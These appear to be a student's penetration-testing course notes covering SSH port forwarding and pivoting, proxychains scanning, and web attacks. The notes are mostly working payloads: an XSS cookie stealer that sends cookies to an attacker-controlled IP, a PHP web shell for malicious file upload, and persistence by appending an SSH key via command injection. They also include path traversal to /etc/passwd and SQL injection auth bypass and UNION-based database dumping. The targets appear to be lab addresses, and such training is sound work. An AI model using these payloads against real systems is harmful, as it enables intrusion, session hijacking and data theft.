#  Set Up Dynamic Port forward 
```
-S for socket file
-O for forward options

requires a filler word to act as credentials (in this case its jump)
ssh -S /tmp/jump jump -O forward -D9050
```
#  Port Interro
```
proxychains nc <ip> <port>
```
#  Multiple port forward with Socket
```
ssh -S /tmp/jump jump -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.100:2222 -L3333:192.168.28.111:80 -L5555:192.168.28.111:2222

# port forward
```
ssh -S /tmp/t1 t1 -O forward -D9050 (previous dynamic port must be canceled ssh -S /tmp/jump jump -O cancel -D99050)
```
# nmap port scan
```
proxychains nmap <ip> (80 & 2222 found)

# Port Forward
```

```
# Authenticate to new ssh with ssh
```
ssh -MS /tmp/t2 creds@127.0.0.1 -p 2323
```
# To get to fowarded web ports
```
On firefox type loopback followed by colon and fowarded port (127.0.0.1:port)
```
#  Proxychains with http script
```
proxychains nmap --script=http-enum.nse 192.168.28.100

#   Outcome
```
directories within website that can be further enumerated
```
#  cookie stealer
```
<script>document.location="http://10.50.27.254:8000/"+document.cookie;</script>
above script ran on vulnerable web page
python3 -m http.server
above ran on lin ops iot intercept traffic
```

#  Malicious file upload script
```
  <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```
will create a file on lin ops with script above and upload to vuln webpage with malicious file upload
1.place to upload ()
2.ability to access location
3.ability to call (directory must be reachable and allow access to newly uploaded script)
#  upload copy of ssh rsa token
```
ssh-keygen  -t rsa -b 4096
cat rsa key
;mkdir /<homedir>/.ssh
; echo "<rsa key>" >> /<homedir>/.ssh/authorized_keys
ssh into web server
```
#  Server side dir traversal
```
Server-Side injection

Directory Traversal/Path Traversal


    Ability to read/execute outside web serverâ€™s directory

    Uses ../../ (relative paths) in manipulating a server-side file path


view_image.php?file=../../etc/passwd
```
#  command injection
test all input fields 
1. ;<command> (prefferbly start with whoami command)

# SQL
#  Starndard Commands
```
SELECT  Extracts data from a database

UNION  Used to combine the result-set of two or more SELECT statements

USE  Selects the DB to use

UPDATE  Updates data in a database

DELETE  Deletes data from a database

INSERT INTO  Inserts new data into a database

CREATE DATABASE  Creates a new database

ALTER DATABASE  Modifies a database

CREATE TABLE  Creates a new table

ALTER TABLE  Modifies a table

DROP TABLE  Deletes a table

CREATE INDEX  Creates an index (search key)

DROP INDEX  Deletes an index
```
mainly using union select or just select/union commands
To select multiple just put a comma after first option followed by second option

#  Testing SQL injection 
attempt admin/password to see if vuln creds exist
then ' or 1='1 on both input fields
#   To get post/get request (Auth bypass)
after verifying input field have no input validation (' or 1='1)
f12 to launch dev console (before submitting ie pressing log in go to the network pane of devs console f12 and click network then submit)
click on post line to reveal a smaller window in dev console
click on request then click raw
hightlight whats avail and paste it to url with a ? (question mark in front of it)

#  Golden Statement
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
                <column>,<column>,<column>              <database>.<table>

```
mysql (to get on sql server)
show database ; (prints all databases on server)
use information_schema ; (use that database)
show tables from information_schema ; 
show columns from columns ;
selecet table_schema from information_schema.columns ; 
select table_name from information_schema.columns ;
select column_name from information_schema.columns ;
select table_schema,table_name,column_name from information_schema.columns
select name,cost,year from session.car ; (first exmaple of info dumping)





table_schema=all databases names accross server
table_name=all tables accross all databses accross server
column_name=all columns accross all tables accross all databases accross server
```
# SQL injection
#   Post method
interact with page then.  First identify vuln field with (' or 1='1) make sure to attempt with all options if necessary.  Second id the # of columns (dont just assume the visible columns are the end all) 
Audi' UNION SELECT 1,2,3,4,5 # (you see columns numbered 1345(notice number 2 was skipped))
from previous command 5 columns were identifies
per demo this golden statement was created to data dump data base after the previous to steps were completed (id vuln and id # of columns this modified golden statement is the third step)
Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
Step 4 Craft queries (# is used to comment out anything that may precede query)(2 is a placeholder bc in previous steps it was discovered the 2nd column doesnt appear and this database wants 5 arguments)
UNION SELECT tireid,2,name,size,cost FROM session.Tires #
UNION SELECT user_id,2,remote_ip,status,5 session.session_log #
UNION SELECT cost,2,size,name,5 session.Tires #
#   Get method
interact with page.  First id vuln field (interact with url bar)(http://10.50.33.78/uniondemo.php?Selection=4&Submit=Submit turns into http://10.50.33.78/uniondemo.php?Selection=4 (OR 1=1))
identify number of columns (UNION SELECT 1,2,3(start with the same number of visible columns and increment if or as needed))
modify golden statement (http://10.50.33.78/uniondemo.php?Selection=3 (UNION SELECT table_schema,column_name,table_name%20from%20information_schema.columns))
craft query(http://10.50.33.78/uniondemo.php?Selection=3 (UNION SELECT id,pass,name from session.user))






















# Misc NOTES
```
test command inject ;whoami
when u see a .html try it
read mission doc/pingsweep & nmap scan said net(nmap --script=http-enum on http ports)/interro ports/port forward/interact with website and test all input field for command injects with ;whoami(to upload rsa and id vuln)/

```
